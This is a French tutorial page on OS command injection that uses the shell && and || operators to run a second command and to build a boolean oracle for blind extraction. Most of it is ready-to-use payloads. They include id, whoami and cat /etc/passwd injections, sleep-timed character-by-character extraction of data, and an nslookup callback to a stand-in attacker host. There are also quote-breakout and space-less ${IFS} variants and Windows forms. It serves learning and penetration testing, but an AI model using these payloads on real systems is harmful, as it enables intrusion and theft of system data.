---
title: "Chaînage conditionnel de commandes avec && et || comme oracle booléen"
description: "Utiliser les opérateurs de shell AND (&&) et OR (||) pour exécuter des commandes en cas de succès ou d'échec et construire un oracle d'exfiltration booléen en injection de commande OS aveugle."
keywords:
  - injection de commande
  - chaînage conditionnel
  - opérateurs logiques
  - oracle booléen
  - injection de commande aveugle
  - injection de shell
---

# Exécution conditionnelle (&& et ||)

Les opérateurs logiques du shell chaînent les commandes sur le **statut de sortie** de celle qui précède. `a && b` exécute `b` seulement si `a` réussit (code de sortie 0) ; `a || b` exécute `b` seulement si `a` échoue (non nul). En injection de commande OS, ils donnent à la fois un moyen d'exécuter une seconde commande et un **oracle booléen** prêt à l'emploi pour l'extraction aveugle.

## Mécanisme

Étant donné un sink comme `ping -c 1 <host>` :

```
127.0.0.1 && id      # id runs because ping succeeded
notahost || id       # id runs because the lookup failed
```

`&&` est utile lorsque la commande prévue réussit normalement et que vous voulez que votre payload la suive proprement. `||` est l'inverse : fournissez une valeur qui fait échouer la première commande, et la vôtre s'exécute à la place. Ensemble, ils vous laissent déclencher un payload quoi que fasse la commande côté hôte.

## L'oracle booléen

La vraie puissance du chaînage conditionnel est de transformer une condition vrai/faux en un effet de bord observable. Faites exécuter une action observable (un délai, un callback DNS) **seulement quand une condition tient** :

```
127.0.0.1 && [ $(whoami) = root ] && sleep 10
127.0.0.1 && [ $(id -u) -eq 0 ] && nslookup t.OOB_ID.attacker.example
```

Si la réponse prend dix secondes (ou que le contact DNS arrive), la condition était vraie. C'est la même primitive d'inférence utilisée en injection SQL aveugle, appliquée à la sortie du shell.

### Extraction caractère par caractère

Combinez l'oracle avec le découpage de chaînes pour lire des données un caractère à la fois :

```
127.0.0.1 && [ "$(id|cut -c1)" = "u" ] && sleep 10
127.0.0.1 && [ "$(cut -c1 /etc/hostname)" = "a" ] && sleep 10
```

Itérez sur la position et le caractère deviné ; un délai confirme chaque correspondance. Les comparaisons `grep`/`expr` fonctionnent là où `[` est filtré :

```
127.0.0.1 && expr $(id -u) = 0 && sleep 10
```

## Contexte et espacement

Comme avec tout séparateur de shell, attention aux guillemets et aux espaces filtrés :

```
"; whoami && echo "          # break out of double quotes first
127.0.0.1&&cat${IFS}/etc/passwd   # ${IFS} for a space-less payload
```

## Note de plateforme

`&&` et `||` se comportent de façon identique sous `cmd.exe` de Windows :

```
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 && ping -n 10 127.0.0.1    # timing on Windows uses -n
```

PowerShell 7+ prend aussi en charge `&&`/`||` ; l'ancien Windows PowerShell ne le fait pas, donc repliez-vous sur `if`/`;` là-bas.

## Outils

- **[commix](https://github.com/commixproject/commix)** : automatise l'extraction booléenne et aveugle par injection de commande.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Intruder pour le sondage par oracle conditionnel.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** : confirmation hors bande d'une condition vraie.

## Références

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: Blind OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
